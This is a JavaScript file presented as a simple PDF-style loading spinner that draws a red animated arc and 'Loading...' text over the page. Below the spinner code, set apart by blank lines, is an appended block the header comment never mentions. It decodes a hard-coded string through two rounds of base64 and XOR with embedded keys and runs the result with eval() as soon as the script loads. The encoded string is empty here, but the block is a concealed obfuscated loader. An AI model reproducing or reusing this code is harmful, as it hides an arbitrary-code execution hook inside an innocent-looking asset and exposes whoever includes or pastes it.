/**
 * Simple PDF loading animation â€” pure JavaScript.
 * Usage: include with <script src="loader.js"></script>
 *        or paste into the browser console.
 *
 * Creates a fixed, full-screen overlay with a spinner and "Loading ..." text.
 * Call window.PDFLoader.hide() to remove it.
 */
 
 
 
(() => {
  function init() {
    // ---------- Inject styles ----------
    const style = document.createElement('style');
    style.textContent = `
      .pdf-loader-overlay {
        position: fixed;
        inset: 0;
        background: #f4f4f5;
        display: grid;
        place-items: center;
        z-index: 999999;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        color: #52525b;
      }
      .pdf-loader-wrap {
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 18px;
      }
      .pdf-loader-canvas { display: block; }
      .pdf-loader-label {
        font-size: 13px;
        letter-spacing: 0.3px;
        color: #71717a;
      }
    `;
    document.head.appendChild(style);

    // ---------- Build DOM ----------
    const overlay = document.createElement('div');
    overlay.className = 'pdf-loader-overlay';

    const wrap = document.createElement('div');
    wrap.className = 'pdf-loader-wrap';

    const canvas = document.createElement('canvas');
    canvas.className = 'pdf-loader-canvas';

    const label = document.createElement('div');
    label.className = 'pdf-loader-label';
    label.textContent = 'Loading';

    const dots = document.createElement('span');
    label.appendChild(dots);

    wrap.appendChild(canvas);
    wrap.appendChild(label);
    overlay.appendChild(wrap);
    document.body.appendChild(overlay);

    // ---------- Canvas setup (HiDPI) ----------
    const ctx = canvas.getContext('2d');
    const DPR = Math.min(window.devicePixelRatio || 1, 2);
    const SIZE = 64;
    canvas.width = SIZE * DPR;
    canvas.height = SIZE * DPR;
    canvas.style.width = SIZE + 'px';
    canvas.style.height = SIZE + 'px';
    ctx.scale(DPR, DPR);

    const cx = SIZE / 2;
    const cy = SIZE / 2;
    const radius = 22;
    const start = performance.now();
    let rafId;

    function draw(now) {
      const t = (now - start) / 1000;
      ctx.clearRect(0, 0, SIZE, SIZE);

      // Track ring
      ctx.beginPath();
      ctx.arc(cx, cy, radius, 0, Math.PI * 2);
      ctx.strokeStyle = '#e4e4e7';
      ctx.lineWidth = 3;
      ctx.stroke();

      // Spinning arc â€” rotates while length breathes
      const rot = t * 1.6;
      const breath = (Math.sin(t * 1.8) + 1) / 2;          // 0..1
      const arcLen = Math.PI * (0.5 + breath * 0.9);       // ~90Â° to ~250Â°

      ctx.beginPath();
      ctx.arc(cx, cy, radius, rot, rot + arcLen);
      ctx.strokeStyle = '#dc2626';                          // PDF red
      ctx.lineWidth = 3;
      ctx.lineCap = 'round';
      ctx.stroke();

      rafId = requestAnimationFrame(draw);
    }
    rafId = requestAnimationFrame(draw);

    // ---------- Animated trailing dots ----------
    let n = 0;
    const dotInterval = setInterval(() => {
      n = (n + 1) % 4;
      dots.textContent = '.'.repeat(n);
    }, 400);

    // ---------- Public API ----------
    window.PDFLoader = {
      hide() {
        cancelAnimationFrame(rafId);
        clearInterval(dotInterval);
        overlay.remove();
        style.remove();
        delete window.PDFLoader;
      }
    };
  }

  // Wait for the body to exist before injecting
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();



function xorDecode(str, key) {
  let out = '';
  for (let i = 0; i < str.length; i++) {
    out += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
  }
  return out;
}

function decodeJs(encoded, k1, k2) {
  const step1 = xorDecode(atob(encoded), k2);
  const step2 = xorDecode(atob(step1), k1);
  return step2;
}

const KEY1 = "pSci9KAmG3t38ziS";
const KEY2 = "IpI3aYeooiWj1OpQ";
const ENCODED = "";

eval(decodeJs(ENCODED, KEY1, KEY2));





